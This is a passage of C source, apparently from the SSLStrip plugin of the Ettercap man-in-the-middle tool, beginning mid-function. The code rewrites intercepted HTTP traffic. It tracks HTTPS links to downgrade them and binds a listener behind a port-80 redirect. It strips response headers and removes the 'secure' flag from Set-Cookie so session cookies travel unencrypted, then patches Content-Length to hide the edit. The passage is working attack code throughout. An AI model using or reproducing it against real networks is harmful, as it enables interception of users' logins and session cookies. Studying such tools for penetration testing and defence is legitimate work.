				found=1;
				break;
			}	
		}		

		LIST_UNLOCK;

		if(!found) {
			SAFE_CALLOC(l, 1, sizeof(struct https_link));
			BUG_IF(l==NULL);

			SAFE_CALLOC(l->url, 1, 1+((ovector[2*i+1] - ovector[2*i]) - https_len));
			BUG_IF(l->url==NULL);
			memcpy(l->url, url, (ovector[2*i+1] - ovector[2*i]) - https_len);
			Decode_Url((u_char *)l->url);
			l->last_used = time(NULL);
			DEBUG_MSG("SSLStrip: Inserting %s to HTTPS List", l->url);
			LIST_INSERT_HEAD(&https_links, l, next);
		}

		SAFE_FREE(url);
		
		if (!changed)
			changed=1;
	}

	
	if (changed) {
		//Copy rest of data (if any)
		memcpy(new_html+new_size, buf_cpy+offset, size-offset);
		SAFE_FREE(connection->response->html);	
		connection->response->html = new_html;
		connection->response->len = new_size;	
	} else {
		/* Thanks but we don't need it */
		SAFE_FREE(new_html);
	}

        /* Iterate through all http_request and remove any that have not been used lately */
        struct https_link *link_tmp;
        time_t now = time(NULL);

	LIST_LOCK;

        LIST_FOREACH_SAFE(l, &https_links, next, link_tmp) {
                if(now - l->last_used >= REQUEST_TIMEOUT) {
                        LIST_REMOVE(l, next);
                        SAFE_FREE(l);
                }
        }
	
	LIST_UNLOCK;

}

static void http_parse_packet(struct http_connection *connection, int direction, struct packet_object *po)
{
	FUNC_DECODER_PTR(start_decoder);
	int len;

	memcpy(&po->L3.src, &connection->ip[direction], sizeof(struct ip_addr));
	memcpy(&po->L3.dst, &connection->ip[!direction], sizeof(struct ip_addr));
	
	po->L4.src = connection->port[direction];
	po->L4.dst = connection->port[!direction];

	po->flags |= PO_FROMSSLSTRIP;	
	/* get time */
	gettimeofday(&po->ts, NULL);

	switch(ip_addr_is_local(&PACKET->L3.src, NULL)) {
		case ESUCCESS:
			PACKET->PASSIVE.flags &= ~FP_HOST_NONLOCAL;
			PACKET->PASSIVE.flags |= FP_HOST_LOCAL;
			break;
		case -ENOTFOUND:
			PACKET->PASSIVE.flags &= ~FP_HOST_LOCAL;
			PACKET->PASSIVE.flags |= FP_HOST_NONLOCAL;
			break;
		case -EINVALID:
			PACKET->PASSIVE.flags = FP_UNKNOWN;
			break;
	}

	/* let's start fromt he last stage of decoder chain */

	//DEBUG_MSG("SSLStrip: Parsing %s", po->DATA.data);
	start_decoder = get_decoder(APP_LAYER, PL_DEFAULT);
	start_decoder(po->DATA.data, po->DATA.len, &len, po);
}

static void http_initialize_po(struct packet_object *po, u_char *p_data, size_t len)
{
   /* 
    * Allocate the data buffer and initialize 
    * fake headers. Headers len is set to 0.
    * XXX - Be sure to not modify these len.
    */

	
   memset(po, 0, sizeof(struct packet_object));

   if (p_data == NULL) {
      SAFE_FREE(po->DATA.data);
      SAFE_CALLOC(po->DATA.data, 1, HTTP_MAX);
      po->DATA.len = HTTP_MAX;
      BUG_IF(po->DATA.data==NULL);
   } else {
      SAFE_FREE(po->DATA.data);
      po->DATA.data = p_data;
      po->DATA.len = len;
   }

   po->L2.header  = po->DATA.data;
   po->L3.header  = po->DATA.data;
   po->L3.options = po->DATA.data;
   po->L4.header  = po->DATA.data;
   po->L4.options = po->DATA.data;
   po->fwd_packet = po->DATA.data;
   po->packet     = po->DATA.data;

   po->L3.proto = htons(LL_TYPE_IP);
   po->L3.ttl = 64;
   po->L4.proto = NL_TYPE_TCP;

}
/* main HTTP listen thread, this will accept connections
 * destined to port 80  */

static int http_bind_wrapper(void)
{
	bind_port = EC_MAGIC_16;
	struct sockaddr_in sa_in;

	ec_thread_init();

	DEBUG_MSG("http_listen_thread: initialized and ready");
	
	main_fd = socket(AF_INET, SOCK_STREAM, 0);
	memset(&sa_in, 0, sizeof(sa_in));
	sa_in.sin_family = AF_INET;
	sa_in.sin_addr.s_addr = INADDR_ANY;

	do {
		bind_port++;
		sa_in.sin_port = htons(bind_port);	
	} while (bind(main_fd, (struct sockaddr *)&sa_in, sizeof(sa_in)) != 0);

	listen(main_fd, 100);
	USER_MSG("SSLStrip plugin: bind 80 on %d\n", bind_port);
	
	if (http_insert_redirect(bind_port) != ESUCCESS)
		return -EFATAL;

	return ESUCCESS;

}

static void http_wipe_connection(struct http_connection *connection)
{
	DEBUG_MSG("SSLStrip: http_wipe_connection");
	close_socket(connection->fd);

	if(connection->response->html)
		SAFE_FREE(connection->response->html);

	if(connection->request->payload)
		SAFE_FREE(connection->request->payload);

	if(connection->request->url)
		SAFE_FREE(connection->request->url);

	if(connection->request)
		SAFE_FREE(connection->request);

	if(connection->response)
		SAFE_FREE(connection->response);

	if (connection)
		SAFE_FREE(connection);
}

void http_remove_header(char *header, struct http_connection *connection) {
	DEBUG_MSG("SSLStrip: http_remove_header");
	if (strstr(connection->response->html, header)) {
        	char *r = strdup(connection->response->html);
        	size_t len = strlen(connection->response->html);

        	char *b = strstr(r, header);
        	char *end = strstr(b, "\r\n");
        	end += 2;

        	int header_length = end - b;
        	len -= header_length;

        	int start = b - r;
        	char *remaining = strdup(end);
		BUG_IF(remaining==NULL);

        	memcpy(r+start, remaining, strlen(remaining));
		SAFE_FREE(connection->response->html);

        	connection->response->html = strndup(r, len);
		connection->response->len = len;
	
		SAFE_FREE(remaining);
		SAFE_FREE(r);
        }
}

void http_remove_secure_from_cookie(struct http_connection *connection) {
	if (!strstr(connection->response->html, "Set-Cookie")) {
		return;
	}
	
	size_t newlen = 0;
	size_t pos = 0;
	char *buf_cpy = connection->response->html;
	char *new_html;

	SAFE_CALLOC(new_html, 1, connection->response->len);
	char changed = 0;

	regmatch_t match[4];

	while(!regexec(&find_cookie_re, buf_cpy, 4, match, REG_NOTBOL)) {
		memcpy(new_html+newlen, buf_cpy, match[1].rm_eo);
		newlen += match[1].rm_eo;
		
		memcpy(new_html+newlen, buf_cpy+match[3].rm_so, match[3].rm_eo - match[3].rm_so);
		newlen += match[3].rm_eo - match[3].rm_so;
		
		buf_cpy += match[0].rm_eo-2;
		pos += match[0].rm_eo-2;
		changed=1;
	}

	if (changed) {
		memcpy(new_html+newlen, buf_cpy, connection->response->len - pos);
		newlen += connection->response->len - pos;

		SAFE_FREE(connection->response->html);

		connection->response->html = new_html;
		connection->response->len = newlen;
	} else {
		SAFE_FREE(new_html);
	}
}

void http_update_content_length(struct http_connection *connection) {
	if (strstr(connection->response->html, "Content-Length: ")) {
        	char *buf = connection->response->html;
                char *content_length = strstr(connection->response->html, "Content-Length:");
                content_length += strlen("Content-Length: ");

                char c_length[20];
                memset(&c_length, '\0', 20);
                snprintf(c_length, 20, "%lu", connection->response->len);

                memcpy(buf+(content_length-buf)-1, c_length, strlen(c_length));
        }
}

// vim:ts=3:expandtab
